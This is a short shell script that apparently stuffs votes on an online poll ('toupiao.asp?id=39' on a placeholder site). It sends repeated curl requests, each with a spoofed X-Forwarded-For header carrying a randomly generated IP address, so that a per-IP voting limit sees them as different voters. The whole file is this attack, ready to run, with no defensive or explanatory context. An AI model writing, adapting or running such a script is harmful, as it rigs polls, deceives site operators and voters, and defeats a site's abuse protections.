#!/bin/sh
##
cnt=20

if [ $# -ge 1 ];
then
    cnt=$1
fi

for i in `seq $cnt`
do
    rd=`date +%N`
    ip1=`echo "$rd%255" | bc`
    rd=`date +%N`
    ip2=`echo "$rd%255" | bc`
    rd=`date +%N`
    ip3=`echo "$rd%255" | bc`
    rd=`date +%N`
    ip4=`echo "$rd%255" | bc`
    random_ip="$ip1.$ip2.$ip3.$ip4"
    echo "idx: $i, ip: $random_ip"
    curl -H "X-Forwarded-For: $random_ip" http://www.some_poor_site.com/toupiao.asp?id=39
    sleep 2
done

#
exit 0
